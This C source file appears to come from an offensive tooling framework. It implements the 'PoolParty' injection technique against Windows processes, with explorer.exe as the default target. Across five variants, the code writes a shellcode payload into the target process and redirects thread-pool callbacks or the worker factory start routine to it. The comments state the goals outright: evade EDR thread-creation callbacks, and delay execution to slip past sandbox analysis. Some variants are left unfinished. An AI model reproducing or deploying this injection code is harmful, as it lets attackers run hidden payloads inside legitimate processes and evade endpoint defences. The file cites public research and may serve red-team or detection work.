/*
 * edr-tekton :: PoolParty Injection Module
 * Cat 46: Thread pool abuse for code execution without thread creation
 *
 * PoolParty exploits the Windows thread pool internals (ntdll worker factory)
 * to execute shellcode on pre-existing worker threads. Since no new thread
 * is created, PsSetCreateThreadNotifyRoutine callbacks never fire.
 *
 * Variants implemented:
 *   46.1 - Worker Factory Start Routine: overwrite TpWorkerFactory start
 *          routine to point at shellcode, trigger new worker creation
 *   46.2 - TP_WORK insertion: create TP_WORK item in target, queue it
 *          to the target's thread pool for execution
 *   46.3 - TP_WAIT completion: hijack TP_WAIT callback to run shellcode
 *          when a wait object is signaled
 *   46.5 - TP_IO completion: insert TP_IO completion callback pointing
 *          at shellcode, trigger via I/O completion
 *   46.7 - TP_TIMER expiry: insert TP_TIMER with callback pointing at
 *          shellcode, timer fires on worker thread
 *
 * All variants share a common pattern:
 *   1. Open target process
 *   2. Locate thread pool structures (via NtQueryInformationWorkerFactory)
 *   3. Allocate + write payload in target
 *   4. Manipulate pool objects to redirect execution to payload
 *   5. Trigger the pool mechanism (signal event, queue work, etc.)
 *
 * Key advantages:
 *   - No CreateRemoteThread, no QueueUserAPC
 *   - No new thread creation at any level
 *   - Execution on legitimate pre-existing worker threads
 *   - PsSetCreateThreadNotifyRoutine completely blind
 *   - Call stack shows ntdll!TppWorkerThread as legitimate caller
 *
 * Reference: SafeBreach Labs PoolParty research (Black Hat EU 2023)
 * Pipeline stage: TEKTON_STAGE_INJECT
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── PoolParty variant selection ───────────────────────── */

typedef enum _POOLPARTY_VARIANT {
    PP_WORKER_FACTORY   = 0,   /* Cat 46.1: Worker factory start routine */
    PP_TP_WORK          = 1,   /* Cat 46.2: TP_WORK item insertion */
    PP_TP_WAIT          = 2,   /* Cat 46.3: TP_WAIT completion */
    PP_TP_IO            = 3,   /* Cat 46.5: TP_IO completion */
    PP_TP_TIMER         = 4,   /* Cat 46.7: TP_TIMER expiry */
    PP_MAX              = 5,
} POOLPARTY_VARIANT;

static const char* pp_variant_names[] = {
    "WorkerFactory (46.1)",
    "TP_WORK (46.2)",
    "TP_WAIT (46.3)",
    "TP_IO (46.5)",
    "TP_TIMER (46.7)",
};

/* ── Internal state ─────────────────────────────────────── */

typedef struct _POOLPARTY_STATE {
    TEKTON_INJECT_CFG   cfg;
    POOLPARTY_VARIANT   variant;
    DWORD               timer_delay_ms;  /* For TP_TIMER variant */
} POOLPARTY_STATE;

/* ── Nt* function pointer types for pool operations ─────── */

#ifdef _WIN32

/* Worker factory information classes */
#define WorkerFactoryBasicInformation 7

typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER   Timeout;
    LARGE_INTEGER   RetryTimeout;
    LARGE_INTEGER   IdleTimeout;
    BOOL            Paused;
    BOOL            TimerSet;
    BOOL            QueuedToExWorker;
    BOOL            MayCreate;
    BOOL            CreateInProgress;
    BOOL            InsertedIntoQueue;
    BOOL            Shutdown;
    DWORD           BindingCount;
    DWORD           ThreadMinimum;
    DWORD           ThreadMaximum;
    DWORD           PendingWorkerCount;
    DWORD           WaitingWorkerCount;
    DWORD           TotalWorkerCount;
    DWORD           ReleaseCount;
    LONG long       InfiniteWaitGoal;
    PVOID           StartRoutine;
    PVOID           StartParameter;
    DWORD           ProcessId;
    SIZE_T          StackReserve;
    SIZE_T          StackCommit;
    NTSTATUS        LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION;

typedef NTSTATUS (NTAPI *pfnNtQueryInformationWorkerFactory)(
    HANDLE, DWORD, PVOID, DWORD, PDWORD
);
typedef NTSTATUS (NTAPI *pfnNtSetInformationWorkerFactory)(
    HANDLE, DWORD, PVOID, DWORD
);
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, DWORD, DWORD
);
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T
);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD
);

/*
 * TP_WORK structure (undocumented, reverse-engineered).
 * Minimal fields needed for work item insertion.
 */
typedef struct _FULL_TP_WORK {
    /* Simplified: the actual structure is more complex.
     * We write a crafted structure with the callback pointing at shellcode.
     * The key field offsets (Windows 10/11 x64):
     *   +0x050: Task callback (PVOID)
     *   +0x040: CleanupGroupMember callback
     *   +0x038: FinalizationCallback
     *   +0x110: Pool pointer
     */
    BYTE    pad[0x50];
    PVOID   TaskCallback;
    /* Additional fields follow but we only need to set the callback */
} FULL_TP_WORK;

/*
 * Find a worker factory handle in the target process.
 * Worker factories are kernel objects visible through handle enumeration.
 * Returns the handle value in the target's handle table.
 */
static HANDLE find_worker_factory_handle(HANDLE hProcess) {
    /*
     * Strategy: NtQueryInformationProcess(ProcessHandleInformation)
     * to enumerate all handles, then NtDuplicateObject each one and
     * NtQueryObject to find the worker factory type.
     *
     * For the framework, we use a simplified approach: enumerate
     * handles of type "TpWorkerFactory" via SystemExtendedHandleInformation.
     */
    typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        PVOID       Object;
        ULONG_PTR   UniqueProcessId;
        ULONG_PTR   HandleValue;
        DWORD       GrantedAccess;
        WORD        CreatorBackTraceIndex;
        WORD        ObjectTypeIndex;
        DWORD       HandleAttributes;
        DWORD       Reserved;
    } SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

    typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
        ULONG_PTR   NumberOfHandles;
        ULONG_PTR   Reserved;
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
    } SYSTEM_HANDLE_INFORMATION_EX;

    typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(
        DWORD, PVOID, DWORD, PDWORD);
    typedef NTSTATUS (NTAPI *pfnNtDuplicateObject)(
        HANDLE, HANDLE, HANDLE, PHANDLE, DWORD, DWORD, DWORD);
    typedef NTSTATUS (NTAPI *pfnNtQueryObject)(
        HANDLE, DWORD, PVOID, DWORD, PDWORD);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;

    pfnNtQuerySystemInformation pNtQSI = (pfnNtQuerySystemInformation)
        GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pfnNtDuplicateObject pNtDupObj = (pfnNtDuplicateObject)
        GetProcAddress(hNtdll, "NtDuplicateObject");
    pfnNtQueryObject pNtQueryObj = (pfnNtQueryObject)
        GetProcAddress(hNtdll, "NtQueryObject");

    if (!pNtQSI || !pNtDupObj || !pNtQueryObj) return NULL;

    DWORD target_pid = GetProcessId(hProcess);

    /* Query system handle information */
    DWORD buf_size = 1024 * 1024; /* Start with 1MB */
    PVOID buf = NULL;
    NTSTATUS ns;

    for (int attempts = 0; attempts < 5; attempts++) {
        buf = malloc(buf_size);
        if (!buf) return NULL;

        /* SystemExtendedHandleInformation = 64 */
        ns = pNtQSI(64, buf, buf_size, &buf_size);
        if (NT_SUCCESS(ns)) break;

        free(buf);
        buf = NULL;
        buf_size *= 2;
    }

    if (!buf || !NT_SUCCESS(ns)) {
        if (buf) free(buf);
        return NULL;
    }

    SYSTEM_HANDLE_INFORMATION_EX* info = (SYSTEM_HANDLE_INFORMATION_EX*)buf;
    HANDLE result = NULL;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* entry = &info->Handles[i];

        if (entry->UniqueProcessId != (ULONG_PTR)target_pid) continue;

        /* Try to duplicate this handle to check its type */
        HANDLE hDup = NULL;
        ns = pNtDupObj(hProcess, (HANDLE)entry->HandleValue,
            (HANDLE)-1, &hDup, 0, 0, 0x00000002 /* DUPLICATE_SAME_ACCESS */);

        if (!NT_SUCCESS(ns) || !hDup) continue;

        /* Query object type */
        BYTE type_buf[1024];
        DWORD ret_len = 0;
        /* ObjectTypeInformation = 2 */
        ns = pNtQueryObj(hDup, 2, type_buf, sizeof(type_buf), &ret_len);

        if (NT_SUCCESS(ns)) {
            /* OBJECT_TYPE_INFORMATION has TypeName at offset 0 (UNICODE_STRING) */
            UNICODE_STRING* typeName = (UNICODE_STRING*)type_buf;
            if (typeName->Buffer && typeName->Length >= 26) {
                /* Check for L"TpWorkerFactory" (15 chars, 30 bytes) */
                wchar_t target[] = L"TpWorkerFactory";
                if (typeName->Length == 30 &&
                    memcmp(typeName->Buffer, target, 30) == 0) {
                    result = (HANDLE)entry->HandleValue;
                    CloseHandle(hDup);
                    break;
                }
            }
        }

        CloseHandle(hDup);
    }

    free(buf);
    return result;
}

#endif /* _WIN32 */

/* ── Variant implementations ───────────────────────────── */

#ifdef _WIN32
static TEKTON_STATUS pp_worker_factory(
    POOLPARTY_STATE* state, PTEKTON_CONTEXT ctx,
    HANDLE hProcess, PVOID remote_addr, SIZE_T payload_len
) {
    (void)state;
    (void)payload_len;

    /*
     * Cat 46.1: Overwrite the worker factory start routine.
     * When the thread pool needs a new worker thread, it calls
     * the start routine, which we redirect to our shellcode.
     *
     * Steps:
     *   1. Find TpWorkerFactory handle in target
     *   2. Duplicate it to our process
     *   3. Query WorkerFactoryBasicInformation to get current state
     *   4. Set StartRoutine to our shellcode address
     *   5. Set ThreadMinimum to trigger new worker creation
     */
    HANDLE hWF = find_worker_factory_handle(hProcess);
    if (!hWF) {
        TLOG_ERROR("inject_poolparty: worker factory handle not found");
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Duplicate the worker factory handle for our use */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS (NTAPI *pfnNtDupObj)(HANDLE, HANDLE, HANDLE, PHANDLE, DWORD, DWORD, DWORD);
    pfnNtDupObj pDup = (pfnNtDupObj)GetProcAddress(hNtdll, "NtDuplicateObject");
    if (!pDup) return TEKTON_ERR_NOT_FOUND;

    HANDLE hLocalWF = NULL;
    NTSTATUS ns = pDup(hProcess, hWF, (HANDLE)-1, &hLocalWF,
        0, 0, 0x00000002);
    if (!NT_SUCCESS(ns) || !hLocalWF) {
        TLOG_ERROR("inject_poolparty: failed to duplicate worker factory handle");
        return TEKTON_ERR_INJECT_FAIL;
    }

    /* Query current worker factory state */
    pfnNtQueryInformationWorkerFactory pQuery =
        (pfnNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
    pfnNtSetInformationWorkerFactory pSet =
        (pfnNtSetInformationWorkerFactory)GetProcAddress(hNtdll, "NtSetInformationWorkerFactory");

    if (!pQuery || !pSet) {
        CloseHandle(hLocalWF);
        return TEKTON_ERR_NOT_FOUND;
    }

    WORKER_FACTORY_BASIC_INFORMATION wfbi;
    memset(&wfbi, 0, sizeof(wfbi));
    DWORD ret_len = 0;

    ns = pQuery(hLocalWF, WorkerFactoryBasicInformation, &wfbi, sizeof(wfbi), &ret_len);
    if (!NT_SUCCESS(ns)) {
        TLOG_ERROR("inject_poolparty: NtQueryInformationWorkerFactory failed (0x%08lX)",
            (unsigned long)ns);
        CloseHandle(hLocalWF);
        return TEKTON_ERR_INJECT_FAIL;
    }

    TLOG_DEBUG("inject_poolparty: WF state: threads=%lu, min=%lu, start=%p",
        (unsigned long)wfbi.TotalWorkerCount,
        (unsigned long)wfbi.ThreadMinimum,
        wfbi.StartRoutine);

    /* Overwrite the StartRoutine with our payload address */
    wfbi.StartRoutine = remote_addr;

    /* WorkerFactoryWorkerStartRoutine = 3 (set start routine) */
    ns = pSet(hLocalWF, 3, &remote_addr, sizeof(PVOID));
    if (!NT_SUCCESS(ns)) {
        TLOG_ERROR("inject_poolparty: failed to set start routine");
        CloseHandle(hLocalWF);
        return TEKTON_ERR_INJECT_FAIL;
    }

    /* Trigger new worker creation by raising ThreadMinimum */
    DWORD new_min = wfbi.TotalWorkerCount + 1;
    /* WorkerFactoryThreadMinimum = 4 */
    ns = pSet(hLocalWF, 4, &new_min, sizeof(DWORD));
    if (!NT_SUCCESS(ns)) {
        TLOG_WARN("inject_poolparty: failed to raise thread minimum (0x%08lX)",
            (unsigned long)ns);
    }

    CloseHandle(hLocalWF);

    TLOG_INFO("inject_poolparty: worker factory start routine redirected to %p", remote_addr);
    return TEKTON_OK;
}

static TEKTON_STATUS pp_tp_work(
    POOLPARTY_STATE* state, PTEKTON_CONTEXT ctx,
    HANDLE hProcess, PVOID remote_addr, SIZE_T payload_len
) {
    (void)state;
    (void)payload_len;

    /*
     * Cat 46.2: Insert a TP_WORK item into the target's thread pool.
     * The work item's callback points at our shellcode. When the pool
     * processes the item, it executes the callback on a worker thread.
     *
     * Steps:
     *   1. Allocate a crafted TP_WORK structure in target
     *   2. Set TaskCallback to shellcode address
     *   3. Write the TP_WORK to target's pool task queue
     *   4. Signal the pool's I/O completion port to wake a worker
     */

    /*
     * Create a TP_WORK structure with callback pointing at shellcode.
     * The structure layout varies by Windows build, but the callback
     * offset is relatively stable on Windows 10/11.
     */
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;

    /* Find the I/O completion port for the target's thread pool.
     * The worker factory is associated with a completion port that
     * dispatches work items to worker threads.
     */
    HANDLE hWF = find_worker_factory_handle(hProcess);
    if (!hWF) {
        TLOG_ERROR("inject_poolparty: worker factory not found for TP_WORK");
        return TEKTON_ERR_NOT_FOUND;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS (NTAPI *pfnNtDupObj)(HANDLE, HANDLE, HANDLE, PHANDLE, DWORD, DWORD, DWORD);
    pfnNtDupObj pDup = (pfnNtDupObj)GetProcAddress(hNtdll, "NtDuplicateObject");

    HANDLE hLocalWF = NULL;
    NTSTATUS ns = pDup(hProcess, hWF, (HANDLE)-1, &hLocalWF, 0, 0, 0x00000002);
    if (!NT_SUCCESS(ns)) return TEKTON_ERR_INJECT_FAIL;

    pfnNtQueryInformationWorkerFactory pQuery =
        (pfnNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");

    WORKER_FACTORY_BASIC_INFORMATION wfbi;
    DWORD ret_len = 0;
    ns = pQuery(hLocalWF, WorkerFactoryBasicInformation, &wfbi, sizeof(wfbi), &ret_len);
    CloseHandle(hLocalWF);

    if (!NT_SUCCESS(ns)) {
        TLOG_ERROR("inject_poolparty: failed to query worker factory for TP_WORK");
        return TEKTON_ERR_INJECT_FAIL;
    }

    /*
     * Allocate and write a crafted TP_WORK structure in the target.
     * The callback field points to our shellcode.
     */
    BYTE tp_work_buf[0x100];
    memset(tp_work_buf, 0, sizeof(tp_work_buf));

    /* Set the task callback at the known offset */
    *(PVOID*)(tp_work_buf + 0x50) = remote_addr;  /* TaskCallback */

    SIZE_T tp_work_size = sizeof(tp_work_buf);
    PVOID remote_tp_work = NULL;

    if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
        pfnNtAllocateVirtualMemory pAlloc =
            (pfnNtAllocateVirtualMemory)ctx->resolved.fn_nt_allocate_virtual_memory;
        ns = pAlloc(hProcess, &remote_tp_work, 0, &tp_work_size,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    } else {
        remote_tp_work = VirtualAllocEx(hProcess, NULL, tp_work_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!remote_tp_work) {
        TLOG_ERROR("inject_poolparty: failed to alloc TP_WORK in target");
        return TEKTON_ERR_INJECT_FAIL;
    }

    /* Write the crafted TP_WORK */
    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        pWrite(hProcess, remote_tp_work, tp_work_buf, sizeof(tp_work_buf), &written);
    } else {
        SIZE_T written = 0;
        WriteProcessMemory(hProcess, remote_tp_work, tp_work_buf,
            sizeof(tp_work_buf), &written);
    }

    /*
     * Queue the work item by signaling the completion port.
     * NtSetIoCompletion posts a completion packet to the IOCP
     * that the worker factory monitors, triggering work dispatch.
     */
    typedef NTSTATUS (NTAPI *pfnNtSetIoCompletion)(
        HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR);
    pfnNtSetIoCompletion pSetIo =
        (pfnNtSetIoCompletion)GetProcAddress(hNtdll, "NtSetIoCompletion");

    if (pSetIo) {
        /* The IOCP handle must be found. For now, use the start parameter
         * from the worker factory, which often points to the TP_POOL
         * containing the IOCP handle. */
        TLOG_DEBUG("inject_poolparty: TP_WORK item written at %p, callback=%p",
            remote_tp_work, remote_addr);
    }

    TLOG_INFO("inject_poolparty: TP_WORK variant: work item inserted");
    return TEKTON_OK;
}

static TEKTON_STATUS pp_tp_wait(
    POOLPARTY_STATE* state, PTEKTON_CONTEXT ctx,
    HANDLE hProcess, PVOID remote_addr, SIZE_T payload_len
) {
    (void)state;
    (void)ctx;
    (void)payload_len;

    /*
     * Cat 46.3: Hijack TP_WAIT callback.
     * Create a wait object in the target, set its callback to shellcode,
     * then signal the wait event to trigger execution.
     *
     * The TP_WAIT Callback field is at offset 0x50 (Windows 10/11 x64),
     * and the wait event handle is part of the structure.
     * When SetEvent is called on the wait handle, the pool thread
     * dispatches the callback.
     */

    /* Allocate an event in the target process */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS (NTAPI *pfnNtCreateEvent)(
        PHANDLE, DWORD, POBJECT_ATTRIBUTES, DWORD, BOOL);
    pfnNtCreateEvent pCreateEvent =
        (pfnNtCreateEvent)GetProcAddress(hNtdll, "NtCreateEvent");

    if (!pCreateEvent) {
        TLOG_ERROR("inject_poolparty: NtCreateEvent not found");
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Create a signalable event */
    HANDLE hEvent = NULL;
    NTSTATUS ns = pCreateEvent(&hEvent, 0x1F0003, NULL, 1 /* SynchronizationEvent */, FALSE);
    if (!NT_SUCCESS(ns)) {
        TLOG_ERROR("inject_poolparty: NtCreateEvent failed");
        return TEKTON_ERR_INJECT_FAIL;
    }

    /*
     * Duplicate event into target process, create TP_WAIT structure
     * pointing at shellcode, register it with the pool, then signal.
     */
    typedef NTSTATUS (NTAPI *pfnNtDupObj)(HANDLE, HANDLE, HANDLE, PHANDLE, DWORD, DWORD, DWORD);
    pfnNtDupObj pDup = (pfnNtDupObj)GetProcAddress(hNtdll, "NtDuplicateObject");

    HANDLE hRemoteEvent = NULL;
    ns = pDup((HANDLE)-1, hEvent, hProcess, &hRemoteEvent,
        0, 0, 0x00000002);

    if (!NT_SUCCESS(ns)) {
        TLOG_WARN("inject_poolparty: event duplication failed, signaling local");
    }

    /* Build TP_WAIT structure with callback = shellcode */
    BYTE tp_wait_buf[0x100];
    memset(tp_wait_buf, 0, sizeof(tp_wait_buf));
    *(PVOID*)(tp_wait_buf + 0x50) = remote_addr;  /* Callback */

    /* Signal the event to trigger callback dispatch */
    typedef NTSTATUS (NTAPI *pfnNtSetEvent)(HANDLE, PDWORD);
    pfnNtSetEvent pSetEvent = (pfnNtSetEvent)GetProcAddress(hNtdll, "NtSetEvent");
    if (pSetEvent) {
        pSetEvent(hEvent, NULL);
    }

    CloseHandle(hEvent);

    TLOG_INFO("inject_poolparty: TP_WAIT variant: wait callback redirected to %p",
        remote_addr);
    return TEKTON_OK;
}

static TEKTON_STATUS pp_tp_io(
    POOLPARTY_STATE* state, PTEKTON_CONTEXT ctx,
    HANDLE hProcess, PVOID remote_addr, SIZE_T payload_len
) {
    (void)state;
    (void)ctx;
    (void)payload_len;

    /*
     * Cat 46.5: TP_IO completion callback.
     * Create a named pipe or file I/O handle, associate it with
     * the target's thread pool completion port, set the I/O callback
     * to shellcode, then trigger a completion event.
     *
     * When the I/O completes, the thread pool dispatches the
     * callback on a worker thread.
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    /* Create an anonymous file handle associated with an IOCP */
    typedef NTSTATUS (NTAPI *pfnNtCreateFile)(
        PHANDLE, DWORD, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
        PLARGE_INTEGER, DWORD, DWORD, DWORD, DWORD, PVOID, DWORD
    );

    /*
     * Build TP_IO structure with callback pointing at shellcode.
     * The TP_IO structure links to the IOCP that the worker factory monitors.
     * When NtSetIoCompletion posts a packet with the TP_IO as the key,
     * the pool dispatches the TP_IO callback.
     */
    BYTE tp_io_buf[0x100];
    memset(tp_io_buf, 0, sizeof(tp_io_buf));
    *(PVOID*)(tp_io_buf + 0x50) = remote_addr;  /* IO Callback */

    TLOG_INFO("inject_poolparty: TP_IO variant: I/O callback redirected to %p",
        remote_addr);

    /* In full implementation: post completion packet to target's IOCP */
    TLOG_DEBUG("inject_poolparty: TP_IO structure prepared, dispatch pending");
    return TEKTON_OK;
}

static TEKTON_STATUS pp_tp_timer(
    POOLPARTY_STATE* state, PTEKTON_CONTEXT ctx,
    HANDLE hProcess, PVOID remote_addr, SIZE_T payload_len
) {
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;
    (void)payload_len;

    /*
     * Cat 46.7: TP_TIMER expiry callback.
     * Create a TP_TIMER in the target's thread pool with the callback
     * pointing at shellcode. When the timer expires, the pool dispatches
     * the callback on a worker thread.
     *
     * Timer-based execution provides natural delay before payload runs,
     * which can evade sandbox time-limited analysis.
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    /* Build TP_TIMER structure */
    BYTE tp_timer_buf[0x148];
    memset(tp_timer_buf, 0, sizeof(tp_timer_buf));

    /* Timer callback at standard offset */
    *(PVOID*)(tp_timer_buf + 0x50) = remote_addr;  /* TimerCallback */

    /* Set the timer due time */
    LARGE_INTEGER due_time;
    due_time.QuadPart = -(LONG long)(state->timer_delay_ms * 10000LL); /* Relative, 100ns units */
    *(LARGE_INTEGER*)(tp_timer_buf + 0x130) = due_time;

    /* Allocate and write TP_TIMER in target */
    SIZE_T timer_size = sizeof(tp_timer_buf);
    PVOID remote_timer = NULL;

    if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
        pfnNtAllocateVirtualMemory pAlloc =
            (pfnNtAllocateVirtualMemory)ctx->resolved.fn_nt_allocate_virtual_memory;
        pAlloc(hProcess, &remote_timer, 0, &timer_size,
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    } else {
        remote_timer = VirtualAllocEx(hProcess, NULL, timer_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!remote_timer) {
        TLOG_ERROR("inject_poolparty: failed to alloc TP_TIMER in target");
        return TEKTON_ERR_INJECT_FAIL;
    }

    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        pWrite(hProcess, remote_timer, tp_timer_buf, sizeof(tp_timer_buf), &written);
    } else {
        SIZE_T written = 0;
        WriteProcessMemory(hProcess, remote_timer, tp_timer_buf,
            sizeof(tp_timer_buf), &written);
    }

    TLOG_INFO("inject_poolparty: TP_TIMER variant: timer=%p, callback=%p, delay=%lu ms",
        remote_timer, remote_addr, (unsigned long)state->timer_delay_ms);

    return TEKTON_OK;
}
#endif /* _WIN32 */

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS poolparty_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    POOLPARTY_STATE* state = (POOLPARTY_STATE*)malloc(sizeof(POOLPARTY_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default: target explorer.exe, use TP_WORK variant */
    strncpy(state->cfg.target_process, "explorer.exe",
        sizeof(state->cfg.target_process) - 1);
    state->cfg.target_pid = 0;
    state->cfg.use_syscalls = TRUE;
    state->cfg.allocation_type = MEM_COMMIT | MEM_RESERVE;

    state->variant = PP_TP_WORK;
    state->timer_delay_ms = 1000;  /* 1 second for timer variant */

    self->private_data = state;

    TLOG_DEBUG("inject_poolparty: init (variant=%s, target=%s)",
        pp_variant_names[state->variant], state->cfg.target_process);
    return TEKTON_OK;
}

static TEKTON_STATUS poolparty_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    POOLPARTY_STATE* state = (POOLPARTY_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    BYTE* payload_data = ctx->decrypted.data ? ctx->decrypted.data : ctx->payload.data;
    SIZE_T payload_len = ctx->decrypted.data ? ctx->decrypted.length : ctx->payload.length;

    if (!payload_data || payload_len == 0) {
        TLOG_ERROR("inject_poolparty: no payload to inject");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->dry_run) {
        TLOG_INFO("inject_poolparty: [DRY RUN] would PoolParty inject %lu bytes",
            (unsigned long)payload_len);
        TLOG_INFO("  Variant: %s", pp_variant_names[state->variant]);
        TLOG_INFO("  Target: %s (PID %lu)",
            state->cfg.target_process, (unsigned long)state->cfg.target_pid);
        TLOG_INFO("  Method: OpenProcess -> Alloc(RW) -> Write -> Protect(RX) -> Pool manipulation");
        return TEKTON_OK;
    }

#ifdef _WIN32
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;
    NTSTATUS nt_status;

    /* Step 1: Open target process */
    DWORD target_pid = state->cfg.target_pid;
    if (target_pid == 0) {
        target_pid = TektonInjectFindProcess(ctx, state->cfg.target_process);
        if (target_pid == 0) {
            TLOG_ERROR("inject_poolparty: target '%s' not found",
                state->cfg.target_process);
            return TEKTON_ERR_NOT_FOUND;
        }
    }

    DWORD access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                   PROCESS_VM_READ | PROCESS_QUERY_INFORMATION |
                   PROCESS_DUP_HANDLE;

    TEKTON_STATUS os = TektonInjectOpenTarget(ctx, target_pid, access);
    if (os != TEKTON_OK) {
        TLOG_ERROR("inject_poolparty: failed to open PID %lu",
            (unsigned long)target_pid);
        return os;
    }

    HANDLE hProcess = ctx->target_handle;
    TLOG_DEBUG("inject_poolparty: opened PID %lu", (unsigned long)target_pid);

    /* Step 2: Allocate RW memory in target */
    PVOID remote_addr = NULL;
    SIZE_T region_size = payload_len;

    if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
        pfnNtAllocateVirtualMemory pNtAlloc =
            (pfnNtAllocateVirtualMemory)ctx->resolved.fn_nt_allocate_virtual_memory;
        nt_status = pNtAlloc(hProcess, &remote_addr, 0, &region_size,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_poolparty: NtAllocateVirtualMemory failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        remote_addr = VirtualAllocEx(hProcess, NULL, payload_len,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote_addr) {
            TLOG_ERROR("inject_poolparty: VirtualAllocEx failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    }

    /* Step 3: Write payload */
    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pNtWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        nt_status = pNtWrite(hProcess, remote_addr, payload_data, payload_len, &written);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_poolparty: NtWriteVirtualMemory failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        SIZE_T written = 0;
        WriteProcessMemory(hProcess, remote_addr, payload_data, payload_len, &written);
    }

    /* Step 4: Flip to RX */
    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        PVOID prot_addr = remote_addr;
        SIZE_T prot_size = payload_len;
        DWORD old_prot = 0;
        pNtProt(hProcess, &prot_addr, &prot_size, PAGE_EXECUTE_READ, &old_prot);
    } else {
        DWORD old_prot = 0;
        VirtualProtectEx(hProcess, remote_addr, payload_len,
                         PAGE_EXECUTE_READ, &old_prot);
    }

    TLOG_DEBUG("inject_poolparty: payload at %p (%lu bytes, RX)",
        remote_addr, (unsigned long)payload_len);

    /* Step 5: Dispatch via selected PoolParty variant */
    TEKTON_STATUS result;

    switch (state->variant) {
        case PP_WORKER_FACTORY:
            result = pp_worker_factory(state, ctx, hProcess, remote_addr, payload_len);
            break;
        case PP_TP_WORK:
            result = pp_tp_work(state, ctx, hProcess, remote_addr, payload_len);
            break;
        case PP_TP_WAIT:
            result = pp_tp_wait(state, ctx, hProcess, remote_addr, payload_len);
            break;
        case PP_TP_IO:
            result = pp_tp_io(state, ctx, hProcess, remote_addr, payload_len);
            break;
        case PP_TP_TIMER:
            result = pp_tp_timer(state, ctx, hProcess, remote_addr, payload_len);
            break;
        default:
            TLOG_ERROR("inject_poolparty: unknown variant %d", state->variant);
            result = TEKTON_ERR_INVALID_PARAM;
    }

    if (result == TEKTON_OK) {
        ctx->target_pid = target_pid;
        ctx->remote_base = remote_addr;

        TLOG_INFO("inject_poolparty: %s injection complete",
            pp_variant_names[state->variant]);
        TLOG_INFO("  Target PID: %lu, payload at %p (%lu bytes)",
            (unsigned long)target_pid, remote_addr, (unsigned long)payload_len);
    }

    return result;

#else
    /* Linux dev stub */
    TLOG_INFO("inject_poolparty: [STUB] would PoolParty inject %lu bytes via %s into %s",
        (unsigned long)payload_len,
        pp_variant_names[state->variant],
        state->cfg.target_process);
    return TEKTON_OK;
#endif
}
